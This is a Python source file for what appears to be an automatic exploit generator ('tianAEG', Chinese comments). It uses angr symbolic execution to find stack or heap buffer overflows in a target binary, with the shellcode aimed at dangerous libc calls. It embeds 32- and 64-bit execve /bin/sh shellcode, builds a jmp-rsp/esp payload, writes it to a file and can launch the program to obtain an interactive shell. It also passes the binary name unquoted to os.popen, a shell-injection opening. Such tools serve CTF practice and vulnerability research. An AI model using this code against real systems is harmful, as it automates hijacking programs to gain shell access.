import angr
import claripy
import logging
import hashlib
import os
from pwn import *
from angr import sim_options as so

l = logging.getLogger("tianAEG")
danger_func_table=['gets','read','__isoc99_scanf','scanf','strcpy','strecpy','strcat']

def fully_symbolic(state, variable):

    for i in range(state.arch.bits):
        if not state.solver.symbolic(variable[i]):
            return False
    return True

def check_continuity(address, addresses, length):

    for i in range(length):
        if not address + i in addresses:
            return False

    return True

def find_symbolic_buffer(state, length):#这个函数的作用就是寻找有写入权限的内存，比如栈的地址或者堆上的

    sym_addrs = [ ]
    for _,symbol in list(state.solver.get_variables('file','stdin')):
        [sym_addrs.extend(state.memory.addrs_for_name(sym_name)) for sym_name in list(symbol.variables)]
    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr#到这里之前会计算出sym_addrs，每次调用find_symbolic_buffer时就会返回其中的一个地址，而之前的代码不会执行

def detect_unconsAndsymbolic(sm,exploitable_states):
    while sm.active or sm.unconstrained:
        sm.step()
        if sm.unconstrained:
            if fully_symbolic(sm.unconstrained[0],sm.unconstrained[0].regs.pc):
                l.info("This blocks is unconstrained and fully symbolic")
                exploitable_states.append(sm.unconstrained[0])
            sm.drop(stash='unconstrained')

def make_exp(exp,binary_name,auto):

    hl=hashlib.md5()
    hl.update(exp)
    filename = '%s-exploit' % str(hl.hexdigest()[:8])
    with open(filename, 'wb') as f:
        f.write(exp)
    l.info("Exp file has writen for the file named %s",filename)
    if auto == '--auto' :
        get_shell(exp,binary_name)

def get_shell(exp,binary_name):
    try:
        l.info("Geting Shell...")
        io=process('./'+binary_name)
        io.sendline(exp)
        io.interactive()
    except:
        l.info("Couldn't auto get shell,please use file %s-exploit to manual")
    return

def pre_handle(state,binary_name):
    shellcode_64 = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    # shellcode_32 = b'jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80'
    shellcode_32=b'1\xc01\xd2Rh//shh/bin\x89\xe31\xc9\xb0-,"\xcd\x80'
    if state.arch.bits == 64 :
        shellcode = shellcode_64
        output = os.popen("ROPgadget --binary " + binary_name + " --only 'jmp|rsp' | grep 'jmp rsp'").read()[:18]
    else:
        shellcode = shellcode_32
        output = os.popen("ROPgadget --binary " + binary_name + " --only 'jmp|esp' | grep 'jmp esp'").read()[:10]
    addr_jmpsp = int(output,16) if len(output) != 0 else 0

    return shellcode , addr_jmpsp

def main(binary_name,auto):

    p = angr.Project(binary_name, load_options={'auto_load_libs': False})
    obj = p.loader.main_object
    danger_func_addrs=[]
    exploitable_states=[]
    obj = p.loader.main_object
    l.info("Looking for dangerous function's address...")
    for func in danger_func_table: #在plt表里寻找危险函数
        danger_plt=obj.plt.get(func)
        if danger_plt:
            danger_func_addrs.append(danger_plt)
            l.info("Found dangerous function address named %s() at %#x",func,danger_plt)

    extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY} #在寻找内存中的符号变量时有用，不加找不到
    state = p.factory.entry_state(add_options=extras)
    state.libc.buf_symbolic_bytes = 0x80 
    state.libc.max_buffer_size = 0x80 #这两条是为了防止找到unconstrained状态而被忽略
    shellcode , addr_jmpsp = pre_handle(state,binary_name)

    sm = p.factory.simgr(state, save_unconstrained=True)
    sm_store=sm.copy()

    if len(danger_func_addrs) != 0 :
        for i in danger_func_addrs:#对每一个危险函数都进行检测
            l.info("Detecting address at %#x",i)
            sm.explore(find=i)#直接转到危险函数地址，节省时间
            sm.move(from_stash='found',to_stash='active')#因为执行完sm.explore()并且find到目标后，angr会自动清空active，但是后面需要再进行检测，active为空则不会进行，所以需要将found状态进行转移到active
            detect_unconsAndsymbolic(sm,exploitable_states)
            sm=sm_store.copy()
    else:#如果plt表没有找到危险函数，则直接进行
        l.warning("There are no dangerous functions, program will use normal way...")
        detect_unconsAndsymbolic(sm,exploitable_states)

    if len(exploitable_states) == 0 :
        l.warning("No siutable state,program will exit...")
        return

    for ep in exploitable_states:
        for buf_addr in find_symbolic_buffer(ep, len(shellcode)):

            if buf_addr >= 0x10000000: #如果找到的内存地址大于这个数字，说明是在栈上，所以进行jmp SP + SHELLCODE进行操作
                shellcode_addr = ep.regs.rsp.args[0] if ep.arch.bits == 64 else ep.regs.esp.args[0]
                pc_addr = addr_jmpsp
                print(hex(shellcode_addr),hex(pc_addr))
            else: #相反则是位于堆上
                shellcode_addr = buf_addr
                pc_addr = buf_addr

            memory = ep.memory.load(shellcode_addr,len(shellcode))
            sc_bvv = ep.solver.BVV(shellcode)
            if ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == pc_addr)):
                ep.add_constraints(memory == sc_bvv)
                ep.add_constraints(ep.regs.pc == pc_addr)
                l.info("Found one exp!!! at address : %#x",shellcode_addr)
                make_exp(ep.posix.dumps(0),binary_name,auto)
                break
        else:
            l.warning("Couldn't find a symbolic buffer for our shellcode! exiting...")

if __name__ == '__main__':
    logging.getLogger("angr").setLevel("CRITICAL")#取消angr的提示消息，CRITICAL级别以下不显示
    l.setLevel("INFO")
    if len(sys.argv) == 3 :
        sys.exit(main(sys.argv[1],sys.argv[2]))
    elif len(sys.argv) == 2 :
        sys.exit(main(sys.argv[1],''))
    else:
        print("this.py filename [--auto] \n Add argv 'auto' can maybe get shell.")